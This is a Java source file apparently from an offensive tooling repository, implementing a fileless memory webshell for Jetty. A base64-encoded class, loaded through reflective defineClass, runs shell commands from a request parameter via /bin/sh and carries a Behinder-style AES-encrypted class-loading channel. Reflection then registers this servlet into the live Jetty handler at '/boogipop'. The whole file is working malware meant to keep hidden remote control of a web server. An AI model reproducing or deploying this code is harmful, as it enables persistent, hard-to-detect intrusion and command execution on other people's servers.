package com.javasec.memshell;
import sun.misc.BASE64Decoder;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
public class JettyServletMemshell {
    private static Object servletHandler = null;
    private static String filterName = "ServletTemplates";
    private static String filterClassName = "com.javasec.memshell.ServletTemplates";
    private static String url = "/*";

    private static synchronized void LoadServlet() throws Exception {
        try{
            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
        }catch (Exception e){
            Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            a.setAccessible(true);
            byte[] b = (new BASE64Decoder()).decodeBuffer("yv66vgAAADIBFgoASAB2CQB3AHgIAHkKAHoAewgAfAsAfQB+CAB/CgANAIAKAIEAggoADQCDCQCEAIUIAIYHAIcIAIgIAIkIAFgIAIoHAIsKAIwAjQoAjACOCgCPAJAKABIAkQgAkgoAEgCTCgASAJQLAJUAlgoAlwB7CgCBAJgLAH0AmQsAfQCaCACbCgCBAJwLAH0AnQgAngsAnwCgCAChCgCiAKMHAKQHAKUKACcAdgsAnwCmCgAnAKcIAKgKACcAqQoAJwCqCgANAKsKACYArAoAogCtBwCuCgAxAHYLAH0ArwoAsACxCgAxALIKAKIAswcAtAoAQgC1CgA+ALYKADcAtwoANwC4CgA+ALkIALoHALsHALwHAL0KAD4AvgcAvwoAwADBBwDCCgBEAMMKAEcAxAcAxQcAxgEAAVUBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvU2VydmxldFRlbXBsYXRlczsBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCHBwBVBwDCAQAKRXhjZXB0aW9ucwcAxwEABWRvR2V0AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAKU291cmNlRmlsZQEAFVNlcnZsZXRUZW1wbGF0ZXMuamF2YQwASwBMBwDIDADJAMoBAB5bK10gRHluYW1pYyBTZXJ2bGV0IHNheXMgaGVsbG8HAMsMAMwAzQEABHR5cGUHAM4MAM8A0AEABWJhc2ljDAC6ANEHANIMANMA1AwA1QDWBwDXDADYAFcBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHANkMANoA2wwA3ADdBwDeDADfAOAMAEsA4QEAAlxBDADiAOMMAOQA1AcA5QwA5gDnBwDoDADpANQMAOkA0AwA6gDUAQAEUE9TVAwA6wDUDADsAO0BAAF1BwDuDADvAPABAANBRVMHAPEMAPIA8wEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA9AD1DAD2APcBAAAMAPYA+AwA+QDUDAD6APsMAEsA/AwA/QD+AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA/wEABwEBDAECANQMAQMBBAwBBQEGAQAoY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMkVQwBBwEIDAEJAQoMAEsBCwwBDAENDAEOAQ8BAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UMARABEQEAEGphdmEvbGFuZy9PYmplY3QHARIMARMBFAEAE2phdmEvbGFuZy9FeGNlcHRpb24MARUATAwAUgBTAQAmY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAcY29tL2Jvb2dpcG9wL21lbXNoZWxsL0NvbmZpZwEAC2dldFBhc3N3b3JkAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpc0VtcHR5AQADKClaAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBABZnZXRCZWhpbmRlclNoZWxsUHdkUHdkAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAEIoTGNvbS9ib29naXBvcC9tZW1zaGVsbC9TZXJ2bGV0VGVtcGxhdGVzO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAEcASAAAAAAABAABAEsATAABAE0AAAAvAAEAAQAAAAUqtwABsQAAAAIATgAAAAYAAQAAAA8ATwAAAAwAAQAAAAUAUABRAAAABABSAFMAAgBNAAACkgAHAAkAAAFqsgACEgO2AAQrEgW5AAYCAMYAiysSBbkABgIAEge2AAiZAHsruAAJuQAGAgBOLcYAai22AAqaAGMBOgSyAAsSDLYACJkAGga9AA1ZAxIOU1kEEg9TWQUtUzoEpwAXBr0ADVkDEhBTWQQSEVNZBS1TOgS7ABJZuAATGQS2ABS2ABW3ABYSF7YAGLYAGToFLLkAGgEAGQW2ABunANEruAAcuQAdAgDGAMUruQAeAQASH7YACJkAr7gAIE4ruQAhAQASIi25ACMDABIkuAAlOgQZBAW7ACZZuwAnWbcAKCu5ACEBABIiuQApAgC2ACoSK7YALLYALbYALhIktwAvtgAwGQS7ADFZtwAyK7kAMwEAtgA0tgA1tgA2OgW7ADdZKiq2ADi2ADm3ADoZBbYAOzoGGQa2ADw6BxkGEj0FvQA+WQMSP1NZBBJAU7YAQToIGQgZBwW9AEJZAytTWQQsU7YAQ1enAAhOLbYARbEAAQCnAWEBZABEAAMATgAAAGYAGQAAABIACAAUACMAFgAtABcAOAAYADsAGQBGABoAXQAcAHEAHgCNAB8AmAAhAKcAJAC1ACUAuQAmAMcAJwDOACgA/wApARkAKgEvACsBNgAsAU0ALQFhADEBZAAvAWUAMAFpADMATwAAAIQADQA7AF0AVABVAAQAjQALAFYAVwAFAC0AawBYAFcAAwC5AKgAWQBXAAMAzgCTAFoAWwAEARkASABcAF0ABQEvADIAXgBfAAYBNgArAGAAYQAHAU0AFABiAGMACAFlAAQAZABlAAMAAAFqAFAAUQAAAAABagBmAGcAAQAAAWoAaABpAAIAagAAABgAB/0AXQcAawcAbBP5ACYC+wDFQgcAbQQAbgAAAAQAAQBvAAQAcABTAAIATQAAAEkAAwADAAAAByorLLYARrEAAAACAE4AAAAKAAIAAAA3AAYAOABPAAAAIAADAAAABwBQAFEAAAAAAAcAZgBnAAEAAAAHAGgAaQACAG4AAAAEAAEAbwAJAHEAcgABAE0AAAArAAAAAQAAAAGxAAAAAgBOAAAABgABAAAAQgBPAAAADAABAAAAAQBzAFUAAAACAHQAAAACAHUASgAAAAoAAQA3AEcASQAA");
            a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
        }
    }

    //获取上下文
    public static synchronized void GetWebContent() throws Exception {
        try{
            Thread currentThread = Thread.currentThread();
            Object contextClassLoader = GetField(currentThread, "contextClassLoader");
            Object _context = GetField(contextClassLoader,"_context");
            servletHandler = GetField(_context,"_servletHandler");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized void InjectServlet() throws Exception {
        if(servletHandler != null){
            //方法二
            Class EvilServlet = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);
            Method addFilterWithMapping = GetMethod(servletHandler, "addServletWithMapping", Class.class, String.class);
            addFilterWithMapping.invoke(servletHandler, EvilServlet, "/boogipop");
        }

    }
    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }

    private static synchronized Method GetMethod(Object obj, String methodName, Class<?>... paramClazz) throws NoSuchMethodException {
        Method method = null;
        Class clazz = obj.getClass();

        while(clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException var6) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            return method;
        }
    }


    public JettyServletMemshell() {
        try{
            LoadServlet();
            GetWebContent();
            InjectServlet();
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
